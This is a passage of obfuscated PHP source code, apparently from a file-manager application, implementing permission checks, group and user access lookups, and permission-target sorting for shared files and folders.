($‚Âó’…î[$ñë¤°ø”[569]] != 0 && !in_array($‚Âó’…î[$ñë¤°ø”[569]], $¤ÅÖ³ò«)) { } } if ($‚Âó’…î[$ñë¤°ø”[569]] == 0) { $‚Âó’…î[$ñë¤°ø”[190]] = SourceModel::TYPE_USER; } $Ê‡Ãğ”[] = array($ñë¤°ø”[193] => $½ê´„Â, $ñë¤°ø”[190] => intval($‚Âó’…î[$ñë¤°ø”[190]]), $ñë¤°ø”[569] => intval($‚Âó’…î[$ñë¤°ø”[569]]), $ñë¤°ø”[2059] => intval($‚Âó’…î[$ñë¤°ø”[2059]]) ? intval($‚Âó’…î[$ñë¤°ø”[2059]]) : 0, $ñë¤°ø”[2119] => intval($‚Âó’…î[$ñë¤°ø”[2119]]) ? intval($‚Âó’…î[$ñë¤°ø”[2119]]) : -1); } $this->where(array($ñë¤°ø”[491] => $½ê´„Â))->delete(); $this->addAll($Ê‡Ãğ”); return !0; } public function authClear($¹ºÜÏ) { $œ„ÄïÖ =& $_SERVER[‹è™Ü¸Ñ]; $ŸÆÎ¢øŸ = Model($œ„ÄïÖ[1398])->sourceInfo($¹ºÜÏ); $–÷º¬•© = array($¹ºÜÏ); if ($ŸÆÎ¢øŸ[$œ„ÄïÖ[485]] == $œ„ÄïÖ[91]) { $¿ÀŠ¸”¸ = array($œ„ÄïÖ[652] => array($œ„ÄïÖ[612], $ŸÆÎ¢øŸ[$œ„ÄïÖ[584]] . $¹ºÜÏ . $œ„ÄïÖ[613])); $–÷º¬•© = Model($œ„ÄïÖ[1398])->field($œ„ÄïÖ[491])->where($¿ÀŠ¸”¸)->getField($œ„ÄïÖ[193], !0); $–÷º¬•©[] = $¹ºÜÏ; } $this->where(array($œ„ÄïÖ[491] => array($œ„ÄïÖ[492], $–÷º¬•©)))->delete(); return !0; } public function getAllChildren($Íç¿¹œ) { $à¦‰¸ =& $_SERVER[‹è™Ü¸Ñ]; $®€Ì»¾€ = Model($à¦‰¸[1398])->sourceInfo($Íç¿¹œ); if ($®€Ì»¾€[$à¦‰¸[485]] != $à¦‰¸[91]) { return $this->sourceListAuth(array($Íç¿¹œ)); } if ($®€Ì»¾€[$à¦‰¸[190]] != SourceModel::TYPE_GROUP) { return array(); } $¢Œ¯ãÄƒ = 1; $ Å€Â½‚ = array($Íç¿¹œ); if ($®€Ì»¾€[$à¦‰¸[192]] == $à¦‰¸[228] && $®€Ì»¾€[$à¦‰¸[569]] != $¢Œ¯ãÄƒ) { $ Å€Â½‚ = $this->groupChidldAllRootSource($®€Ì»¾€[$à¦‰¸[569]]); } $Í¼û»üü = $this->field($à¦‰¸[193])->group($à¦‰¸[193])->select(); $Í¼û»üü = array_to_keyvalue($Í¼û»üü, $à¦‰¸[12], $à¦‰¸[193]); if (!$Í¼û»üü) { return array(); } $Úü˜üıó = $à¦‰¸[2138]; $Ëô¼ëØ = array($à¦‰¸[193] => array($à¦‰¸[7], $Í¼û»üü), $à¦‰¸[505] => $à¦‰¸[228]); $¢á­ïÚÛ = Model($à¦‰¸[879])->field($Úü˜üıó)->where($Ëô¼ëØ)->select(); $ş’ù¥× = array($Íç¿¹œ); foreach ($¢á­ïÚÛ as $Ì±©Øüê) { foreach ($ Å€Â½‚ as $¹¹ùÔíå) { $¶Êß…½ = $à¦‰¸[50] . $¹¹ùÔíå . $à¦‰¸[50]; $Ç¥Ğ†Œ = $Ì±©Øüê[$à¦‰¸[584]] . $Ì±©Øüê[$à¦‰¸[193]] . $à¦‰¸[50]; if (strstr($Ç¥Ğ†Œ, $¶Êß…½)) { $ş’ù¥×[] = $Ì±©Øüê[$à¦‰¸[193]]; break; } } } return $this->sourceListAuth($ş’ù¥×); } private function sourceListAuth($¡ –ÆŸ¡) { $ì¥’ïæª =& $_SERVER[‹è™Ü¸Ñ]; $’ï¯Ÿş± = Model($ì¥’ïæª[1398])->sourceListInfo($¡ –ÆŸ¡, !0); $™Ì²Œü¼ = $this->sourceAuthSelect($¡ –ÆŸ¡); $¶Â¯ôµ = array(); $¤Ø¸Î±ã = array(); foreach ($’ï¯Ÿş± as $ì®¡¡‚Ù) { unset($ì®¡¡‚Ù[$ì¥’ïæª[529]]); unset($ì®¡¡‚Ù[$ì¥’ïæª[527]]); unset($ì®¡¡‚Ù[$ì¥’ïæª[487]]); unset($ì®¡¡‚Ù[$ì¥’ïæª[90]]); $•­×°ñ‹ = $™Ì²Œü¼[$ì®¡¡‚Ù[$ì¥’ïæª[193]]]; if (!$•­×°ñ‹) { continue; } $ì®¡¡‚Ù[$ì¥’ïæª[2139]] = $this->authTargetInfo($•­×°ñ‹); $ì®¡¡‚Ù[$ì¥’ïæª[582]] = rtrim($ì®¡¡‚Ù[$ì¥’ïæª[588]], $ì¥’ïæª[8]) . $ì¥’ïæª[8] . ltrim($ì®¡¡‚Ù[$ì¥’ïæª[582]], $ì¥’ïæª[8]); $¶Â¯ôµ[] = $ì®¡¡‚Ù; $»×Ä¹¦‡ = count(explode($ì¥’ïæª[8], trim($ì®¡¡‚Ù[$ì¥’ïæª[582]], $ì¥’ïæª[8]))); $¤Ø¸Î±ã[] = $»×Ä¹¦‡ + ($ì®¡¡‚Ù[$ì¥’ïæª[33]] == $ì¥’ïæª[78] ? 0 : 1000); } array_multisort($¤Ø¸Î±ã, SORT_ASC, $¶Â¯ôµ); return $¶Â¯ôµ; } private function groupChidldAllRootSource($´õ›ÏŞ†) { $‹ô™§÷Ø =& $_SERVER[‹è™Ü¸Ñ]; $™èù°™æ = Model($‹ô™§÷Ø[2140])->groupChildrenAll($´õ›ÏŞ†); $¿®±…Í = array($‹ô™§÷Ø[192] => 0, $‹ô™§÷Ø[569] => array($‹ô™§÷Ø[7], $™èù°™æ), $‹ô™§÷Ø[190] => SourceModel::TYPE_GROUP); $üŸÙ³† = Model($‹ô™§÷Ø[879])->field($‹ô™§÷Ø[193])->where($¿®±…Í)->select(); $üŸÙ³† = array_to_keyvalue($üŸÙ³†, $‹ô™§÷Ø[12], $‹ô™§÷Ø[193]); return $üŸÙ³†; } private function authTargetInfo($§Ú‚°–¯) { $ãÄ¨©ùÅ =& $_SERVER[‹è™Ü¸Ñ]; $±ßÙ¯ = array(); $ı›ÖÃ¢í = array(); $¢•ŠµõÇ = 2 << 25; foreach ($§Ú‚°–¯ as $¸Óè”ä) { $ß•ÊÌºÛ = Model($ãÄ¨©ùÅ[571])->listData($¸Óè”ä[$ãÄ¨©ùÅ[2059]]); if (!$ß•ÊÌºÛ) { continue; } if ($¸Óè”ä[$ãÄ¨©ùÅ[190]] == SourceModel::TYPE_USER) { $†“¦º¨ = Model($ãÄ¨©ùÅ[577])->getInfoSimpleOuter($¸Óè”ä[$ãÄ¨©ùÅ[569]]); if ($†“¦º¨[$ãÄ¨©ùÅ[1752]] == $ãÄ¨©ùÅ[1253]) { continue; } if ($†“¦º¨[$ãÄ¨©ùÅ[1752]] == $ãÄ¨©ùÅ[228]) { $†“¦º¨[$ãÄ¨©ùÅ[32]] = LNG($ãÄ¨©ùÅ[2141]); } } else { $†“¦º¨ = Model($ãÄ¨©ùÅ[585])->getInfoSimple($¸Óè”ä[$ãÄ¨©ùÅ[569]]); } if (!$†“¦º¨) { continue; } $†“¦º¨[$ãÄ¨©ùÅ[540]] = $ß•ÊÌºÛ; $±ßÙ¯[] = $†“¦º¨; $˜ÆÆç¥™ = 0; if ($¸Óè”ä[$ãÄ¨©ùÅ[190]] == SourceModel::TYPE_GROUP) { $˜ÆÆç¥™ = $¢•ŠµõÇ * 2; } if ($¸Óè”ä[$ãÄ¨©ùÅ[190]] == SourceModel::TYPE_USER) { $˜ÆÆç¥™ = $¢•ŠµõÇ; } if ($¸Óè”ä[$ãÄ¨©ùÅ[190]] == SourceModel::TYPE_USER && $¸Óè”ä[$ãÄ¨©ùÅ[569]] == $ãÄ¨©ùÅ[228]) { $˜ÆÆç¥™ = 0; } $ı›ÖÃ¢í[] = $ß•ÊÌºÛ[$ãÄ¨©ùÅ[487]] + $˜ÆÆç¥™; } array_multisort($ı›ÖÃ¢í, SORT_DESC, $±ßÙ¯); return $±ßÙ¯; } public function getAllChildrenByUser($£îéÙç¡, $µ°××—) { $Ûƒ˜èä =& $_SERVER[‹è™Ü¸Ñ]; $ âË«„Ê = Model($Ûƒ˜èä[598])->getInfo($µ°××—); if (!$µ°××— || !$£îéÙç¡ || !$ âË«„Ê) { return array(); } $Î”¡Œ— = Model($Ûƒ˜èä[1398])->sourceInfo($£îéÙç¡); $çğüÆÀò = array(); $Äî•¦‚× = 1; if ($Î”¡Œ—[$Ûƒ˜èä[192]] == $Ûƒ˜èä[228] && $Î”¡Œ—[$Ûƒ˜èä[569]] != $Äî•¦‚× && $this->groupContainUser($Î”¡Œ—[$Ûƒ˜èä[569]], $µ°××—)) { foreach ($ âË«„Ê[$Ûƒ˜èä[2142]] as $¬ÈÄû»‘) { $ãÃ»¯á£ = Model($Ûƒ˜èä[585])->getInfo($¬ÈÄû»‘[$Ûƒ˜èä[1951]]); $³Å—ÀÖ¾ = Model($Ûƒ˜èä[598])->getInfoSimpleOuter($µ°××—); $³Å—ÀÖ¾[$Ûƒ˜èä[540]] = $¬ÈÄû»‘[$Ûƒ˜èä[487]]; if (Model($Ûƒ˜èä[571])->authCheckAction($¬ÈÄû»‘[$Ûƒ˜èä[487]][$Ûƒ˜èä[487]], $Ûƒ˜èä[1972])) { continue; } $øŸŸ“»¶ = array($Ûƒ˜èä[32] => $Ûƒ˜èä[1273] . $ãÃ»¯á£[$Ûƒ˜èä[32]], $Ûƒ˜èä[193] => $ãÃ»¯á£[$Ûƒ˜èä[90]][$Ûƒ˜èä[193]], $Ûƒ˜èä[87] => KodIO::make($ãÃ»¯á£[$Ûƒ˜èä[90]][$Ûƒ˜èä[193]]), $Ûƒ˜èä[192] => $Ûƒ˜èä[228], $Ûƒ˜èä[190] => $Ûƒ˜èä[578], $Ûƒ˜èä[33] => $Ûƒ˜èä[616], $Ûƒ˜èä[582] => $ãÃ»¯á£[$Ûƒ˜èä[589]], $Ûƒ˜èä[1951] => $ãÃ»¯á£[$Ûƒ˜èä[1951]], $Ûƒ˜èä[586] => $ãÃ»¯á£[$Ûƒ˜èä[192]], $Ûƒ˜èä[2139] => array($³Å—ÀÖ¾)); $çğüÆÀò[$øŸŸ“»¶[$Ûƒ˜èä[193]]] = $øŸŸ“»¶; } } $¨Î¶Äìö = array(); $»„ÅÊˆ = $this->getAllChildren($£îéÙç¡); foreach ($»„ÅÊˆ as $Ø‹ÇÇÄ) { $Ú¾Ë•…ë = !1; foreach ($Ø‹ÇÇÄ[$Ûƒ˜èä[2139]] as $ó”ƒ“) { if ($ó”ƒ“[$Ûƒ˜èä[1752]]) { if ($ó”ƒ“[$Ûƒ˜èä[1752]] == $µ°××—) { $Ú¾Ë•…ë = !0; break; } } if ($ó”ƒ“[$Ûƒ˜èä[1951]]) { if ($this->groupContainUser($ó”ƒ“[$Ûƒ˜èä[1951]], $µ°××—)) { $Ú¾Ë•…ë = !0; break; } } } if ($Ú¾Ë•…ë) { $¨Î¶Äìö[] = $Ø‹ÇÇÄ; } $¥”ô§ğ© = $Ø‹ÇÇÄ[$Ûƒ˜èä[193]]; if (isset($çğüÆÀò[$¥”ô§ğ©])) { $Ø‹ÇÇÄ[$Ûƒ˜èä[2139]][] = $çğüÆÀò[$¥”ô§ğ©][0]; $çğüÆÀò[$¥”ô§ğ©] = !1; } } $çğüÆÀò = array_filter(array_values($çğüÆÀò)); $¨Î¶Äìö = array_merge($çğüÆÀò, $¨Î¶Äìö); return $¨Î¶Äìö; } public function setAllChildrenByUser($®åã›óò, $ğĞíòÜ˜, $ñèÛé‰Ï) { $…ô¢°úÇ =& $_SERVER[‹è™Ü¸Ñ]; $ßûĞ«Ää = $this->getAllChildrenByUser($®åã›óò, $ğĞíòÜ˜); if (!$ñèÛé‰Ï || !$ßûĞ«Ää) { return !1; } foreach ($ßûĞ«Ää as $÷‡ÉÖ››) { $™ùŒ‚Š½ = array(); foreach ($÷‡ÉÖ››[$…ô¢°úÇ[2139]] as $Ñ±İÂã) { $âù¿¨†¾ = $Ñ±İÂã[$…ô¢°úÇ[540]]; $øÁ„¢“ = $Ñ±İÂã[$…ô¢°úÇ[1752]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ê­Ş½é‘ = $Ñ±İÂã[$…ô¢°úÇ[1752]] ? $Ñ±İÂã[$…ô¢°úÇ[1752]] : $Ñ±İÂã[$…ô¢°úÇ[1951]]; if ($Ñ±İÂã[$…ô¢°úÇ[1752]] && $Ñ±İÂã[$…ô¢°úÇ[1752]] == $ğĞíòÜ˜) { continue; } $™ùŒ‚Š½[] = array($…ô¢°úÇ[193] => $÷‡ÉÖ››[$…ô¢°úÇ[193]], $…ô¢°úÇ[190] => $øÁ„¢“, $…ô¢°úÇ[569] => intval($ê­Ş½é‘), $…ô¢°úÇ[2059] => isset($âù¿¨†¾[$…ô¢°úÇ[475]]) ? intval($âù¿¨†¾[$…ô¢°úÇ[475]]) : 0, $…ô¢°úÇ[2119] => isset($âù¿¨†¾[$…ô¢°úÇ[2119]]) ? intval($âù¿¨†¾[$…ô¢°úÇ[2119]]) : -1); } $™ùŒ‚Š½[] = array($…ô¢°úÇ[193] => $÷‡ÉÖ››[$…ô¢°úÇ[193]], $…ô¢°úÇ[190] => SourceModel::TYPE_USER, $…ô¢°úÇ[569] => intval($ğĞíòÜ˜), $…ô¢°úÇ[2059] => intval($ñèÛé‰Ï), $…ô¢°úÇ[2119] => -1); $this->where(array($…ô¢°úÇ[491] => $÷‡ÉÖ››[$…ô¢°úÇ[193]]))->delete(); $this->addAll($™ùŒ‚Š½); } return !0; } public function get($Şèé°°«) { $¨Á¾´ŸÙ = $this->getSourceList(array($Şèé°°«), !0); return $¨Á¾´ŸÙ[0]; } public function getSourceList($÷£Ê»†ä, $Áœ¾Œ“Ö = false, $‘ùÇú™è = false) { $¦–™ÄğÏ =& $_SERVER[‹è™Ü¸Ñ]; if (!$÷£Ê»†ä) { return array(); } $¡á®Ó”ƒ = Model($¦–™ÄğÏ[1398]); if (!$Áœ¾Œ“Ö && count($÷£Ê»†ä) == 1) { $Áœ¾Œ“Ö = array(); $Áœ¾Œ“Ö[$÷£Ê»†ä[0]] = $¡á®Ó”ƒ->sourceInfo($÷£Ê»†ä[0]); } if (!$Áœ¾Œ“Ö) { $½Ç€íóÑ = array($¦–™ÄğÏ[491] => array($¦–™ÄğÏ[492], $÷£Ê»†ä)); $Áœ¾Œ“Ö = $¡á®Ó”ƒ->field($¦–™ÄğÏ[2143])->where($½Ç€íóÑ)->select(); $Áœ¾Œ“Ö = array_to_keyvalue($Áœ¾Œ“Ö, $¦–™ÄğÏ[193]); } $õ©³ïĞª = $÷£Ê»†ä; foreach ($Áœ¾Œ“Ö as $¹Õƒ½Ê => $ı½ö¢©) { $§ŞŠûé¾ = $¡á®Ó”ƒ->parentLevelArray($ı½ö¢©[$¦–™ÄğÏ[584]]); $õ©³ïĞª = array_merge($õ©³ïĞª, array($¹Õƒ½Ê), array_reverse($§ŞŠûé¾)); } $õ©³ïĞª = array_values(array_unique($õ©³ïĞª)); if (!$õ©³ïĞª) { return array(); } $–Ì³³é = $this->sourceAuthSelect($õ©³ïĞª); $éğ—âÊ† = array(); foreach ($õ©³ïĞª as $ªÍ·Ëí) { if (isset($–Ì³³é[$ªÍ·Ëí])) { $éğ—âÊ†[$ªÍ·Ëí] = $–Ì³³é[$ªÍ·Ëí]; } } $¶ò²şş = $this->userIsRoot($‘ùÇú™è); $ËÉşà­Ä = AuthModel::authAll(); $«ê»î÷ = array($¦–™ÄğÏ[488] => $ËÉşà­Ä, $¦–™ÄğÏ[2144] => array($¦–™ÄğÏ[493] => 0, $¦–™ÄğÏ[1957] => $ËÉşà­Ä, $¦–™ÄğÏ[494] => LNG($¦–™ÄğÏ[2145]), $¦–™ÄğÏ[1974] => $¦–™ÄğÏ[2146])); $«ª·É‚ = array(); foreach ($Áœ¾Œ“Ö as $ªÍ·Ëí => $ÁŒµí’“) { if ($¶ò²şş && $GLOBALS[$¦–™ÄğÏ[6]][$¦–™ÄğÏ[1970]]) { $«ª·É‚[$ªÍ·Ëí] = $«ê»î÷; continue; } $«ª·É‚[$ªÍ·Ëí] = $this->makeSourceAuth($ÁŒµí’“, $éğ—âÊ†, $‘ùÇú™è); } return $«ª·É‚; } public function authDeepCheck($­íû«Ë, $ŠëöñÎµ = false) { $şÙ·“úæ =& $_SERVER[‹è™Ü¸Ñ]; $ŠëöñÎµ = $ŠëöñÎµ ? $ŠëöñÎµ : USER_ID; $´ìŒè¤« = $this->makeAuthDeep($ŠëöñÎµ); if (!in_array($­íû«Ë, $´ìŒè¤«[$şÙ·“úæ[2147]])) { return !1; } $ä’é¸é = array(); foreach ($´ìŒè¤«[$şÙ·“úæ[2148]] as $Øşï©ãÅ => $ë„ ÎĞØ) { if (!in_array($­íû«Ë, $ë„ ÎĞØ)) { continue; } $ä’é¸é[] = $Øşï©ãÅ; } if (!$ä’é¸é) { return !1; } $Ì¸ªü÷ñ = $ä’é¸é ? $ä’é¸é[0] : $­íû«Ë; return array($şÙ·“úæ[488] => -1, $şÙ·“úæ[540] => array($şÙ·“úæ[493] => $şÙ·“úæ[1253], $şÙ·“úæ[1957] => $şÙ·“úæ[228], $şÙ·“úæ[494] => LNG($şÙ·“úæ[2149]), $şÙ·“úæ[1974] => $şÙ·“úæ[2150]), $şÙ·“úæ[2151] => LNG($şÙ·“úæ[2152]), $şÙ·“úæ[2153] => $this->sourceAuthInfo($Ì¸ªü÷ñ)); } protected function makeAuthDeep($–â„¥ = false) { $Â’¬Ÿû =& $_SERVER[‹è™Ü¸Ñ]; static $®È–Š‘ß = array(); $–â„¥ = $–â„¥ ? $–â„¥ : USER_ID; if (isset($®È–Š‘ß[$–â„¥])) { return $®È–Š‘ß[$–â„¥]; } $ˆí‡Ãºó = Model($Â’¬Ÿû[2154])->listData(); $©™ÆòËŒ = array(); foreach ($ˆí‡Ãºó as $§áŞ×®) { if ($§áŞ×®[$Â’¬Ÿû[487]] == 0 && $§áŞ×®[$Â’¬Ÿû[1973]] == $Â’¬Ÿû[91]) { $©™ÆòËŒ[] = $§áŞ×®[$Â’¬Ÿû[475]]; } } $Ú‰±íÎÆ = $this->userGroupParents($–â„¥); $ê¤·„æ± = array($Â’¬Ÿû[190] => SourceModel::TYPE_USER, $Â’¬Ÿû[569] => $–â„¥); if ($Ú‰±íÎÆ) { $ê¤·„æ± = array(array($Â’¬Ÿû[190] => SourceModel::TYPE_USER, $Â’¬Ÿû[569] => $–â„¥), array($Â’¬Ÿû[190] => SourceModel::TYPE_GROUP, $Â’¬Ÿû[569] => array($Â’¬Ÿû[492], $Ú‰±íÎÆ)), $Â’¬Ÿû[1058] => $Â’¬Ÿû[2053]); } $È‘å»Û› = $this->field($Â’¬Ÿû[2155])->where($ê¤·„æ±)->select(); $şı›Ç¯  = array(); $¥¼—ŠèÀ = array_to_keyvalue_group($È‘å»Û›, $Â’¬Ÿû[193]); foreach ($¥¼—ŠèÀ as $Ã¢™¢½ => $¼—•Çù ) { $£ŒßÚ¸Ó = $this->authArrayCheck($¼—•Çù , $–â„¥); if ($£ŒßÚ¸Ó[$Â’¬Ÿû[488]] > 0) { $şı›Ç¯ [] = $Ã¢™¢½ . $Â’¬Ÿû[12]; } } if ($Ú‰±íÎÆ) { $Ù¤´÷æ¤ = Model($Â’¬Ÿû[585]); foreach ($Ú‰±íÎÆ as $ó¹£ª¾ã) { $çó’İ‘§ = $Ù¤´÷æ¤->getInfo($ó¹£ª¾ã); if (!$çó’İ‘§ || !is_array($çó’İ‘§[$Â’¬Ÿû[90]])) { continue; } $şı›Ç¯ [] = $çó’İ‘§[$Â’¬Ÿû[90]][$Â’¬Ÿû[193]]; } } $¢ÍáÎ‰¢ = array(); $¤÷‰´Şë = $Ú‰±íÎÆ; $³Ã×ª‹ä = Model($Â’¬Ÿû[1398]); $Ù¤´÷æ¤ = Model($Â’¬Ÿû[585]); $ÉÈş¼õ = array(); $·ÄõŞÙù = array(); $®«‰–»š = array(); $ªñ—†Å‰ = array(); if ($şı›Ç¯ ) { $”¥«şÎ“ = $³Ã×ª‹ä->where(array($Â’¬Ÿû[193] => array($Â’¬Ÿû[492], $şı›Ç¯ )))->select(); foreach ($”¥«şÎ“ as $‚Òíœšµ) { $¸ˆ•ª˜ƒ = $³Ã×ª‹ä->parentLevelArray($‚Òíœšµ[$Â’¬Ÿû[584]]); $¢ÍáÎ‰¢ = array_merge($¢ÍáÎ‰¢, $¸ˆ•ª˜ƒ); $¤÷‰´Şë[] = $‚Òíœšµ[$Â’¬Ÿû[569]]; $ÉÈş¼õ[$‚Òíœšµ[$Â’¬Ÿû[193]]] = $¸ˆ•ª˜ƒ; $·ÄõŞÙù[$‚Òíœšµ[$Â’¬Ÿû[193]]] = $‚Òíœšµ[$Â’¬Ÿû[569]]; } } $¤÷‰´Şë = array_values(array_unique($¤÷‰´Şë)); $…ŸÊí¯„ = $¤÷‰´Şë; foreach ($…ŸÊí¯„ as $ó¹£ª¾ã) { $çó’İ‘§ = $Ù¤´÷æ¤->getInfo($ó¹£ª¾ã); $¸ˆ•ª˜ƒ = $³Ã×ª‹ä->parentLevelArray($çó’İ‘§[$Â’¬Ÿû[584]]); $¤÷‰´Şë = array_merge($¤÷‰´Şë, $¸ˆ•ª˜ƒ); } $¤÷‰´Şë = array_values(array_unique($¤÷‰´Şë)); foreach ($¤÷‰´Şë as $ó¹£ª¾ã) { $çó’İ‘§ = $Ù¤´÷æ¤->getInfo($ó¹£ª¾ã); $¢ÍáÎ‰¢[] = $çó’İ‘§[$Â’¬Ÿû[90]][$Â’¬Ÿû[193]]; $®«‰–»š[$ó¹£ª¾ã] = $çó’İ‘§[$Â’¬Ÿû[90]][$Â’¬Ÿû[193]]; $ªñ—†Å‰[$ó¹£ª¾ã] = $³Ã×ª‹ä->parentLevelArray($çó’İ‘§[$Â’¬Ÿû[584]]); } foreach ($ÉÈş¼õ as $öÛÆî => $»ê“ı“) { $ªöƒıñ· = $·ÄõŞÙù[$öÛÆî]; if (!$ªöƒıñ· || !$®«‰–»š[$ªöƒıñ·]) { continue; } $›©ÅÜİ§ = array(); foreach ($ªñ—†Å‰[$ªöƒıñ·] as $ó¹£ª¾ã) { $›©ÅÜİ§[] = $®«‰–»š[$ó¹£ª¾ã]; } $ÉÈş¼õ[$öÛÆî] = array_merge($›©ÅÜİ§, $»ê“ı“); } $¢ÍáÎ‰¢ = array_values(array_unique($¢ÍáÎ‰¢)); $ø«ˆ‹åä = array($Â’¬Ÿû[2147] => $¢ÍáÎ‰¢, $Â’¬Ÿû[2148] => $ÉÈş¼õ); $®È–Š‘ß[$–â„¥] = $ø«ˆ‹åä; return $ø«ˆ‹åä; } private function makeSourceAuth($è¥Ë¼Ô, $‹¬Àı÷—, $»®ôª‹ = false) { $Õöì…ÛÏ =& $_SERVER[‹è™Ü¸Ñ]; $úşÓ–¦ò = $Õöì…ÛÏ[91]; $¸å¦Åğ = $è¥Ë¼Ô[$Õöì…ÛÏ[569]]; $“–ÏÚ¡¬ = $è¥Ë¼Ô[$Õöì…ÛÏ[190]] == SourceModel::TYPE_GROUP; $àÊóöÁŸ = $“–ÏÚ¡¬ ? $this->groupRootAuth($¸å¦Åğ, $»®ôª‹) : !1; if ($àÊóöÁŸ && Model($Õöì…ÛÏ[571])->authCheckAction($àÊóöÁŸ[$Õöì…ÛÏ[487]], $Õöì…ÛÏ[1972])) { return $this->groupAuthInfo($àÊóöÁŸ, $¸å¦Åğ); } $˜£¯Şáó = Model($Õöì…ÛÏ[1398])->parentLevelArray($è¥Ë¼Ô[$Õöì…ÛÏ[584]]); $˜£¯Şáó = array_merge(array($è¥Ë¼Ô[$Õöì…ÛÏ[193]]), array_reverse($˜£¯Şáó)); $¶©üÅÊş = !1; foreach ($˜£¯Şáó as $»Ó’é†) { if (!isset($‹¬Àı÷—[$»Ó’é†])) { continue; } $×¶‘˜ı˜ = $this->authMake($‹¬Àı÷—[$»Ó’é†], $»®ôª‹); if ($×¶‘˜ı˜[$Õöì…ÛÏ[540]]) { $¶©üÅÊş = $×¶‘˜ı˜; break; } } if (!$“–ÏÚ¡¬) { return $¶©üÅÊş; } if (!$¶©üÅÊş && $àÊóöÁŸ) { $¶©üÅÊş = $this->groupAuthInfo($àÊóöÁŸ, $¸å¦Åğ); } if (!$¶©üÅÊş) { $áùÒ¤Üº = Model($Õöì…ÛÏ[585])->getInfo($¸å¦Åğ); $Ä­ĞÒÈ‡ = explode($Õöì…ÛÏ[50], trim($áùÒ¤Üº[$Õöì…ÛÏ[584]], $Õöì…ÛÏ[50])); $Ä­ĞÒÈ‡ = array_reverse($Ä­ĞÒÈ‡); foreach ($Ä­ĞÒÈ‡ as $ú¿Ú’ğ) { if ($ú¿Ú’ğ == $Õöì…ÛÏ[228] || $ú¿Ú’ğ == $úşÓ–¦ò) { continue; } $áÊÔ¶¥Ñ = $this->groupRootAuth($ú¿Ú’ğ, $»®ôª‹); if (!$áÊÔ¶¥Ñ) { continue; } $¶©üÅÊş = $this->groupAuthInfo($áÊÔ¶¥Ñ, $ú¿Ú’ğ); break; } } if (!$¶©üÅÊş || $¶©üÅÊş[$Õöì…ÛÏ[488]] <= 0) { $ÆÒ©óƒ¡ = $this->authDeepCheck($è¥Ë¼Ô[$Õöì…ÛÏ[193]], $»®ôª‹); if ($ÆÒ©óƒ¡) { $¶©üÅÊş = $ÆÒ©óƒ¡; } } return $¶©üÅÊş; } private function userIsRoot($Áò­ÅÕÔ = false) { $ú£û§Ú­ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Áò­ÅÕÔ && KodUser::isRoot()) { return !0; } $ŠÎ‹¡öË = Model($ú£û§Ú­[598])->getInfo($Áò­ÅÕÔ); $¸ğâôòÀ = Model($ú£û§Ú­[2156])->listData($ŠÎ‹¡öË[$ú£û§Ú­[2157]]); if ($¸ğâôòÀ && $¸ğâôòÀ[$ú£û§Ú­[575]][$ú£û§Ú­[2158]] == 1) { return !0; } return !1; } private function sourceAuthInfo($—·ÕçÍ“) { $‰‚»ä½ï =& $_SERVER[‹è™Ü¸Ñ]; $©½Ç¦Ê‡ = Model($‰‚»ä½ï[1398]); $’îÒÖÆà = $©½Ç¦Ê‡->sourceInfo($—·ÕçÍ“); if (!$’îÒÖÆà) { return !1; } $©½Ç¦Ê‡->groupPathDisplay($’îÒÖÆà); $Ä†Îì–½ = array($’îÒÖÆà); $Ä†Îì–½ = $©½Ç¦Ê‡->_listAppendPath($Ä†Îì–½); $’îÒÖÆà = $Ä†Îì–½[0]; $ÈÈ·‰›† = $’îÒÖÆà[$‰‚»ä½ï[582]]; if (isset($’îÒÖÆà[$‰‚»ä½ï[590]])) { $¼ÓçÔÒ = explode($‰‚»ä½ï[8], trim($’îÒÖÆà[$‰‚»ä½ï[582]], $‰‚»ä½ï[8])); array_shift($¼ÓçÔÒ); $ÈÈ·‰›† = $’îÒÖÆà[$‰‚»ä½ï[588]] . $‰‚»ä½ï[2159] . implode($‰‚»ä½ï[8], $¼ÓçÔÒ); } return array($‰‚»ä½ï[494] => $’îÒÖÆà[$‰‚»ä½ï[32]], $‰‚»ä½ï[87] => KodIO::make($’îÒÖÆà[$‰‚»ä½ï[193]]), $‰‚»ä½ï[2160] => $ÈÈ·‰›†); } private function groupAuthInfo($ã÷È¹ÑÌ, $ÄÊ£Ù™¬) { $¿Î°—ëô =& $_SERVER[‹è™Ü¸Ñ]; $”ã¢ÅŠ¹ = Model($¿Î°—ëô[585])->getInfo($ÄÊ£Ù™¬); return array($¿Î°—ëô[2161] => intval($ã÷È¹ÑÌ[$¿Î°—ëô[487]]), $¿Î°—ëô[2144] => $ã÷È¹ÑÌ, $¿Î°—ëô[2162] => LNG($¿Î°—ëô[2163]), $¿Î°—ëô[2153] => array($¿Î°—ëô[494] => $”ã¢ÅŠ¹[$¿Î°—ëô[32]], $¿Î°—ëô[87] => KodIO::make($”ã¢ÅŠ¹[$¿Î°—ëô[90]][$¿Î°—ëô[193]]), $¿Î°—ëô[2160] => $”ã¢ÅŠ¹[$¿Î°—ëô[589]])); } protected function groupRootAuth($‡´¹¤±, $¿ßö÷¼° = false) { $ ˆ•Ûì =& $_SERVER[‹è™Ü¸Ñ]; $¿ßö÷¼° = $¿ßö÷¼° ? $¿ßö÷¼° : USER_ID; $‡å­¦Úç = $¿ßö÷¼° . $ ˆ•Ûì[2164] . $‡´¹¤±; static $Ä¶¼ÎÉ¿ = array(); if (isset($Ä¶¼ÎÉ¿[$‡å­¦Úç])) { return $Ä¶¼ÎÉ¿[$‡å­¦Úç]; } $˜¬ë¿€Ì = Model($ ˆ•Ûì[585])->getInfo($‡´¹¤±); $®‘¬‚›É = $this->userGroupList($¿ßö÷¼°); $£™°”¦õ = isset($®‘¬‚›É[$‡´¹¤±]) ? $®‘¬‚›É[$‡´¹¤±][$ ˆ•Ûì[487]] : !1; if ($£™°”¦õ && Model($ ˆ•Ûì[571])->authCheckAction($£™°”¦õ[$ ˆ•Ûì[487]], $ ˆ•Ûì[1972])) { $Ä¶¼ÎÉ¿[$‡å­¦Úç] = $£™°”¦õ; return $£™°”¦õ; } $ŸƒƒèªÎ = $this->sourceAuthSelect($˜¬ë¿€Ì[$ ˆ•Ûì[90]][$ ˆ•Ûì[193]]); $î€ß¨¦¿ = $ŸƒƒèªÎ ? $this->authMake($ŸƒƒèªÎ, $¿ßö÷¼°) : !1; $Ê®ÍÁŠí = $î€ß¨¦¿ ? $î€ß¨¦¿[$ ˆ•Ûì[540]] : !1; $Ä¶¼ÎÉ¿[$‡å­¦Úç] = $Ê®ÍÁŠí 